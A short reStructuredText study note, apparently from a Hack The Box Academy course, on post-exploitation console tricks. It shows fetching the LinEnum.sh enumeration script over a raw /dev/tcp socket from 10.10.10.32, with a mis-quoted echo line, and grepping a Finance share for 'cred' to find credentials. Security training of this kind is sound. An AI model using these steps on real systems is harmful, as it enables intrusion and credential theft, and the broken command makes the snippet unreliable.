#######
console
#######
2024-11-28 22:20

Status:

Tags: 


Example 1: You can use console to download a file

.. code-block:: console

   exec 3<>/dev/tcp/10.10.10.32/80


Get the file you need

.. code-block:: console

   echo -e "GET /LinEnum.sh HTTP/1.1\n\n\">&3

Print the file

.. code-block:: console

   cat <&3

Example 2: Finding files with a certain string

.. code-block:: console

   grep -rn /mnt/Finance/ -ie cred

**************
References
**************
https://academy.hackthebox.com/module/116/section/1140
